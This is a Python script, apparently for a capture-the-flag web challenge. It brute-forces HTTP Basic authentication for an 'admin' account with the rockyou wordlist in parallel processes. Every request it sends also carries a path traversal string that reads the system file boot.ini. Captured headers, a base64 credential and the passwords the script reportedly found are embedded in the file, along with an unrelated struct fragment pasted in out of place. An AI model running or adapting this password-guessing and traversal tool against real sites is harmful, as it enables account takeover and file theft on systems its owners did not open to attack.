#! /usr/bin/env python

"""
POST /johnny/admin/ HTTP/1.1
Host: web.onlinectf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web.onlinectf.com/johnny/
DNT: 1
Authorization: Basic YWRtaW46YWNhc2E=
Connection: keep-alive
Upgrade-Insecure-Requests: 1
"""


"""
HTTP/1.1 401 Unauthorized
Date: Sat, 16 Sep 2017 22:28:33 GMT
Content-Type: text/html; charset=iso-8859-1
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: __cfduid=d411d098596d463eb43b24caa6291ed571505600913; expires=Sun, 16-Sep-18 22:28:33 GMT; path=/; domain=.onlinectf.com; HttpOnly
x-frame-options: SAMEORIGIN
WWW-Authenticate: Basic realm="Restricted Area"
Server: cloudflare-nginx
CF-RAY: 39f7426c72b52926-OTP
"""
'''
HTTP/1.1 500 Internal Server Error
Date: Sun, 17 Sep 2017 06:14:32 GMT
Content-Type: text/html; charset=iso-8859-1
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: __cfduid=d983b9f19a48f57d534489ada8b8fdf9e1505628871; expires=Mon, 17-Sep-18 06:14:31 GMT; path=/; domain=.onlinectf.com; HttpOnly
x-frame-options: SAMEORIGIN
Server: cloudflare-nginx
CF-RAY: 39f9ed017391290e-OTP
'''
    '''
    _fields_ = [
                ("magic", c_char * 4),
                ("payload_size", c_uint32),
                ("header_md5", c_ubyte * 8),
                ("etl", c_uint8 * 7), # always zero
                ("unused_1", c_char),
                ("password_len", c_uint16),
                ("padding_len", c_uint16),
                ("unused_2", c_ubyte * 4),
                ("plaintext_md5", c_ubyte * 16)
                ]

    names = [
                "magic",            
                "payload_size",
                "header_md5",       
                "etl",          
                "unused_1", 
                "password_len", 
                "padding_len",  
                "unused_2", 
                "plaintext_md5"
            ] 
    '''
    
from http.client import *
from base64 import b64encode
import multiprocessing as mp
import optparse

# by default pass_file is 
# pfile = "/usr/share/wordlists/rockyou.txt"
username    = "admin"
pfile       = "/usr/share/wordlists/rockyou.txt"

def main():
    parser = optparse.OptionParser("usage%prog" +\
                    "-u <username> -p <password_list>")
    parser.add_option( "-u", dest="uname", type="string", \
                    help="specify username")
    parser.add_option( "-p", dest="plist", type="string", \
                    help="specify password list")
    (options, args) = parser.parse_args()
    if (options.uname == None) | (options.plist == None):
        print parser.usage
        username    = "admin"
        pfile       = "/usr/share/wordlists/rockyou.txt"
    else:
        username = options.uname
        pfile    = options.plist

    print "[+] BF for username : {0}".format(username)
    print "[+] Chosen pw list  : {0}".format(pfile)


    N_CPU   = 3
    N       = 64
    pool    = mp.Pool(N_CPU)
    
    print "Multi Starting"
    with open(pfile) as passfile:
        pool.imap_unordered(OpenConnection, (password for password in passfile))
        pool.close()
        pool.join()

def OpenConnection(passwd):
    '''
        worker function which creates HTTP Connection
        if returned status code is other than 500
        it means that auth has taken place 
    '''
    print "[*] Trying {0}".format(passwd)
    conection1      = HTTPConnection("web.onlinectf.com", 80)

    passwd = passwd.rstrip()
    #create username:password b64 encode string for HTTP header
    userpass        = bytes(username + ':' + passwd)
    string_userpass = b64encode(userpass).decode('iso-8859-1')
    auth_header     = { 'Authorization' : 'Basic %s' % string_userpass}
    #print auth_header
    #Submitting POST method
    conection1.request('POST', '/johnny/admin/logging/logviewer.jsp?logfile=../../../../../../../boot.ini', headers=auth_header)
    response = conection1.getresponse()
    print response.getheaders()
    print "--------------------------"
    #print response.status
    if response.status != 500:
        print "[-------------------------------------------]"
        print "[+] Status: {0} for pws: {1}".format(response.status, passwd)
        print "[+] Auth header: {0}".format(string_userpass)
        print "[-------------------------------------------]"
        return 0


# callback running only in __main__

def quit(arg):
    print "quitting with %g" % arg
    # note: p is visible because it's global in __main__
    pool.terminate()  # kill all pool workers

if __name__ == '__main__':
    main()
    #OpenConnection("#1HOGETTE")
    #OpenConnection("#1HOLDEN")
    #OpenConnection("#1HOGFAN")
    #OpenConnection("$$$ODIE")
    #OpenConnection("$$$money")
    #OpenConnection("$GETMONEY")
   
'''
    pws found:
[+] Password found: #1HOGETTE
[+] Password found: #1HOLDEN
[+] Password found: #1HOGFAN
[+] Password found: $$$ODIE
[+] Password found: $$$money
[+] Password found: $GETMONEY


'''